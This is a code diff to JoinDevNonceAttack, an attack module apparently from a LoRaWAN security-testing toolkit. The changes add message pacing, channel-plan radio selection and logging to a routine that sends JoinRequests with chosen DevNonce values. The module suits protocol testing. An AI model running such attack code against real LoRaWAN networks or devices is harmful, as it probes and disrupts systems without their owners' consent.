@@ -163,6 +163,15 @@ class JoinDevNonceAttack(BaseAttack):
                 )
 
             final_devnonce, selection_meta = self._select_final_devnonce(config, generation_cache)
+
+            # Apply inter-message pacing before the final check JoinRequest.
+            inter_delay = ctx.timeout
+            if inter_delay > 0 and not ctx.cancel_event.is_set():
+                ctx.logger.debug(
+                    "Inter-message delay: %.1fs before final DevNonce check", inter_delay
+                )
+                self._sleep_until(time.monotonic() + inter_delay, ctx.cancel_event)
+
             final_result = self._execute_join_step(
                 ctx=ctx,
                 config=config,
@@ -243,9 +252,12 @@ class JoinDevNonceAttack(BaseAttack):
             raise ValueError("valid_devnonce_step must be >= 1")
         if config.result_cache_size < 1:
             raise ValueError("result_cache_size must be >= 1")
-        if timing.join_accept_timeout_sec < timing.rx2_delay_sec + timing.rx2_window_sec:
+        # join_accept_timeout_sec must cover at least the full RX2 window.
+        min_timeout = timing.rx2_delay_sec + timing.rx2_window_sec
+        if timing.join_accept_timeout_sec < min_timeout:
             raise ValueError(
-                "join_accept_timeout_sec must be >= rx2_delay_sec + rx2_window_sec"
+                f"join_accept_timeout_sec ({timing.join_accept_timeout_sec}) must be "
+                f">= rx2_delay_sec + rx2_window_sec ({min_timeout})"
             )
         if config.final_check not in {
             "same_as_last",
@@ -312,6 +324,18 @@ class JoinDevNonceAttack(BaseAttack):
             )
             cache.store(result)
 
+            # Apply inter-message pacing (scenario.timeout_sec) between requests,
+            # but skip the sleep after the last message in the generation phase.
+            if index < config.valid_join_count - 1 and not ctx.cancel_event.is_set():
+                inter_delay = ctx.timeout
+                if inter_delay > 0:
+                    ctx.logger.debug(
+                        "Inter-message delay: %.1fs before JoinRequest #%d",
+                        inter_delay,
+                        index + 2,
+                    )
+                    self._sleep_until(time.monotonic() + inter_delay, ctx.cancel_event)
+
         ctx.logger.info(
             "Accepted joins: %d/%d",
             cache.accepted_count,
@@ -331,6 +355,10 @@ class JoinDevNonceAttack(BaseAttack):
         timestamp = time.time()
         # Set runtime DevNonce so apply_join_accept() can derive session keys
         ctx.device.runtime.dev_nonce = dev_nonce
+
+        # Resolve per-attempt radio: use channel plan when available
+        radio = self._select_join_radio(ctx, attempt_index)
+
         join_request = build_join_request(
             join_eui=ctx.device._join_eui,
             dev_eui=ctx.device._dev_eui,
@@ -338,7 +366,14 @@ class JoinDevNonceAttack(BaseAttack):
             app_key=ctx.device._app_key,
         )
 
-        ctx.gateway.forward_uplink(join_request, ctx.radio)
+        ctx.logger.debug(
+            "JoinRequest #%d frequency=%d (channel plan: %s)",
+            attempt_index,
+            radio.frequency,
+            getattr(ctx.device.runtime.channel_plan, "region", "none"),
+        )
+
+        ctx.gateway.forward_uplink(join_request, radio)
         ctx.capture.capture_uplink(
             phy_payload=join_request,
             packet_type="join_request",
@@ -347,6 +382,7 @@ class JoinDevNonceAttack(BaseAttack):
                 "attempt": attempt_index,
                 "dev_nonce": dev_nonce.hex(),
                 "final_check": config.final_check,
+                "frequency_hz": radio.frequency,
             },
         )
 
@@ -369,6 +405,21 @@ class JoinDevNonceAttack(BaseAttack):
             join_accepted=accepted,
             timestamp=timestamp,
         )
+
+    def _select_join_radio(self, ctx: "AttackContext", attempt_index: int) -> Any:
+        """Return RadioMetadata for this JoinRequest, using channel plan when available."""
+        from lora_attack_toolkit.core.schema import RadioMetadata
+
+        channel_plan = ctx.device.runtime.channel_plan
+        if channel_plan is not None:
+            channel = channel_plan.select_join_channel(attempt_index - 1, now=time.time())
+            return RadioMetadata(
+                frequency=channel.frequency_hz,
+                data_rate=channel.data_rate,
+                rssi=ctx.radio.rssi,
+                snr=ctx.radio.snr,
+            )
+        return ctx.radio
 
     def _wait_for_join_accept(
         self,
@@ -544,10 +595,6 @@ class JoinDevNonceAttack(BaseAttack):
             "recent_accepted_devnonces": [value.hex() for value in generation_cache.recent_accepted_devnonces],
             "timing": {
                 "join_accept_timeout_sec": timing.join_accept_timeout_sec,
-                "rx1_delay_sec": timing.rx1_delay_sec,
-                "rx1_window_sec": timing.rx1_window_sec,
-                "rx2_delay_sec": timing.rx2_delay_sec,
-                "rx2_window_sec": timing.rx2_window_sec,
             },
         }
 
